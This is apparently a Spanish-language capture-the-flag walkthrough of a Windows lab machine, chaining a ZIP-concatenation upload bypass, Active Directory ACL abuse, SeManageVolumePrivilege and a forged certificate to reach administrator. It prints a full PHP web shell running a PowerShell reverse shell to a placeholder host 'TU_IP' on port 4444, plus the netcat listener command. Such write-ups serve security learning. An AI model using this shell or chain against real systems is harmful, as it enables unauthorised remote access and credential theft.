

---

![image](Imágenes/20250602083020.png)


El camino Tomado es:

- ZIP concatenation
- ACL Abuse
- SeManageVolumePrivilege
- Golden Certificate
---


# Enumeración inicial


## Puertos

![image](Imágenes/20250602100852.png)


## Web

![image](Imágenes/20250602101444.png)

![image](Imágenes/20250602101515.png)

Encontramos la opción de crear cuenta:

![image](Imágenes/20250602103415.png)

![image](Imágenes/20250602103528.png)

Creamos cuentas tanto de Profesor, como de alumno. Siendo la de alumno la única valida para ser explotada.

Mediante `join` un curso random, podemos ver que se habilita un boton `submit` con el que subir un archivo:


![image](Imágenes/20250602103623.png)



![image](Imágenes/20250602103700.png)

Subimos un ZIP como explicamos a continuación y conseguimos acceso.

![image](Imágenes/20250602103723.png)

# Acceso

PASOS para explotar [zip concatenation](https://perception-point.io/blog/evasive-concatenated-zip-trojan-targets-windows-users/)
1. Crear `.pdf` vacio: `touch false.pdf`
2. Comprimir: `zip begin.zip false.pdf`
3. crear `.php` malicioso `malicious_file/shell.php`:

```php
<?php
shell_exec("powershell -nop -w hidden -c \"\$client = New-Object System.Net.Sockets.TCPClient('TU_IP',4444); \$stream = \$client.GetStream(); [byte[]]\$bytes = 0..65535|%{0}; while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){; \$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0,\$i); \$sendback = (iex \$data 2>&1 | Out-String ); \$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> '; \$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2); \$stream.Write(\$sendbyte,0,\$sendbyte.Length); \$stream.Flush()}; \$client.Close()\"");
?>
```

4. combinar ambos zip:  `cat benign.zip malicious.zip > combined.zip`
5. SUBIR `combined.zip`
6. En la respuesta, buscar el lugar donde se ha subido y cambiar el archivo `false.pdf` por `malicious_files/shell.php` junto a `nc -lnvp 4444`

![image](Imágenes/20250602110938.png)

Y voilá!

![image](Imágenes/20250602111109.png)


Enumerando, llegamos a encontrar credenciales en texto plano de lo que parede una BBDD.

![image](Imágenes/20250602111545.png)

Abrimos la BBDD y sacamos los hashes:

![image](Imágenes/20250602123419.png)

Guardamos cada uno en un archivo `.hash` diferente e intentamos crackearlo:

![image](Imágenes/20250602123837.png)
Sincronizamos con el DC y ejecutamos bloodhound:

![image](Imágenes/20250602205421.png)

# Movimiento lateral y Escalada

En bloodhound podemos ver que poseemos `GenericALL` sobre `ryan.k`.


![image](Imágenes/20250602210131.png)

Pero tambien podemos ver si analizamos correctamente, que en caso de añadir a `sara.b` al grupo `IIS_IUSRS`, conseguimos `SeImpersonatePriv`:

![image](Imágenes/20250602213955.png)

Sacamos el NT hash de `Ryan.k`:

![image](Imágenes/20250602214036.png)

Sacamos un certificado después de darnos acceso a `C:\` haciendo uso de `SeManageVolumeExploit.exe`:

![image](Imágenes/20250602220402.png)

Modificamos el certificado para que sea valido para el `administrador` y poder sacar su NTLM:

![image](Imágenes/20250602222922.png)

Sacamos las Flags:


![image](Imágenes/20250602223110.png)



HAPPY HACKING



![image](Imágenes/20250602223239.png)
